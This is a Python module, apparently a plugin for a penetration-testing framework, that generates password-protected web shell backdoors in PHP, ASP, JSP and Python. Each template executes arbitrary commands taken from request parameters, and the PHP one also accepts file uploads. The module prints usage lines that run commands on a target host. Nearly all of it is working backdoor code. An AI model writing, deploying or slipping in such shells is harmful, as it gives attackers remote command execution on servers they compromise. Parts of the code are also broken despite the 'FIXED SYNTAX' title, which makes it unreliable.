"""
Simple Web Shell Backdoor - FIXED SYNTAX
"""

MODULE_INFO = {
    "description": "Generate web shell backdoors for authorized testing"
}

OPTIONS = {
    "type": {
        "type": "choice",
        "description": "Web shell type",
        "required": True,
        "choices": ["php", "asp", "jsp", "python"],
        "default": "php"
    },
    "output": {
        "type": "str",
        "description": "Output filename",
        "required": False,
        "default": "shell.php"
    },
    "password": {
        "type": "str",
        "description": "Access password",
        "required": False,
        "default": "pass123"
    }
}

def generate_php_shell(password):
    """Generate PHP web shell"""
    return f'''<?php
// Simple PHP Web Shell - For authorized testing only
error_reporting(0);
$pass = "{password}";

if(isset($_GET['cmd']) && isset($_GET['p']) && $_GET['p'] == $pass) {{
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}}

if(isset($_POST['cmd']) && isset($_POST['p']) && $_POST['p'] == $pass) {{
    echo "<pre>";
    system($_POST['cmd']);
    echo "</pre>";
}}

// File upload feature
if(isset($_FILES['file']) && isset($_POST['p']) && $_POST['p'] == $pass) {{
    $target = basename($_FILES['file']['name']);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {{
        echo "File uploaded: $target";
    }} else {{
        echo "Upload failed";
    }}
}}

// Simple login form
echo '
<html>
<body>
<form method="post">
Password: <input type="password" name="p">
<input type="submit" value="Login">
</form>
</body>
</html>
';
?>
'''

def generate_asp_shell(password):
    """Generate ASP web shell"""
    return f'''<%
' ASP Web Shell - For authorized testing only
Dim pass: pass = "{password}"
Dim cmd

If Request.QueryString("p") = pass Then
    cmd = Request.QueryString("cmd")
    If cmd <> "" Then
        Set wshell = CreateObject("WScript.Shell")
        Set exec = wshell.Exec("cmd /c " & cmd)
        Response.Write("<pre>" & exec.StdOut.ReadAll() & "</pre>")
    End If
End If

If Request.Form("p") = pass Then
    cmd = Request.Form("cmd")
    If cmd <> "" Then
        Set wshell = CreateObject("WScript.Shell")
        Set exec = wshell.Exec("cmd /c " & cmd)
        Response.Write("<pre>" & exec.StdOut.ReadAll() & "</pre>")
    End If
End If
%>

<html>
<body>
<form method="post">
Password: <input type="password" name="p">
Command: <input type="text" name="cmd">
<input type="submit" value="Execute">
</form>
</body>
</html>
'''

def generate_python_shell():
    """Generate Python web shell (for frameworks)"""
    return '''#!/usr/bin/env python3
# Python Web Shell - Use with caution
import os, sys, cgi

print("Content-type: text/html\\n\\n")

form = cgi.FieldStorage()
password = "pass123"
cmd = form.getvalue('cmd', '')
p = form.getvalue('p', '')

if p == password and cmd:
    print(f"<pre>Executing: {cmd}</pre>")
    try:
        result = os.popen(cmd).read()
        print(f"<pre>{result}</pre>")
    except Exception as e:
        print(f"<pre>Error: {e}</pre>")

print('''
<html>
<body>
<form method="post">
Password: <input type="password" name="p"><br>
Command: <input type="text" name="cmd" size="50"><br>
<input type="submit" value="Execute">
</form>
</body>
</html>
''')
'''

def generate_jsp_shell(password):
    """Generate JSP web shell"""
    return f'''<%@ page import="java.util.*,java.io.*" %>
<%
// JSP Web Shell - For authorized testing only
String pass = "{password}";
String p = request.getParameter("p");

if (pass.equals(p)) {{
    String cmd = request.getParameter("cmd");
    if (cmd != null) {{
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String s;
        out.print("<pre>");
        while ((s = stdInput.readLine()) != null) {{
            out.println(s);
        }}
        out.print("</pre>");
    }}
}}
%>

<html>
<body>
<form method="post">
Password: <input type="password" name="p">
Command: <input type="text" name="cmd">
<input type="submit" value="Execute">
</form>
</body>
</html>
'''

def run(session, options):
    shell_type = options.get("type", "php")
    output_file = options.get("output", "shell.php")
    password = options.get("password", "pass123")
    
    print("⚠️  LEGAL WARNING: For authorized penetration testing only!")
    print("⚠️  Do not use on systems without explicit permission!")
    print("-" * 60)
    
    consent = input("Do you understand and accept responsibility? (yes/no): ")
    if consent.lower() != 'yes':
        print("Operation cancelled.")
        return False
    
    # Generate shell based on type
    if shell_type == "php":
        content = generate_php_shell(password)
    elif shell_type == "asp":
        content = generate_asp_shell(password)
    elif shell_type == "jsp":
        content = generate_jsp_shell(password)
    elif shell_type == "python":
        content = generate_python_shell()
    else:
        content = generate_php_shell(password)  # Default
    
    # Save to file
    try:
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(content)
        
        print(f"[+] Web shell generated: {output_file}")
        print(f"[+] Type: {shell_type.upper()}")
        print(f"[+] Password: {password}")
        print(f"[+] Size: {len(content)} bytes")
        print("\n[+] Usage examples:")
        print(f"    URL: http://target.com/{output_file}?p={password}&cmd=whoami")
        print(f"    POST: curl -X POST -d 'p={password}&cmd=id' http://target.com/{output_file}")
        print("\n[!] Remember: Use only for authorized testing!")
        
        return True
        
    except Exception as e:
        print(f"[!] Error generating shell: {e}")
        return False
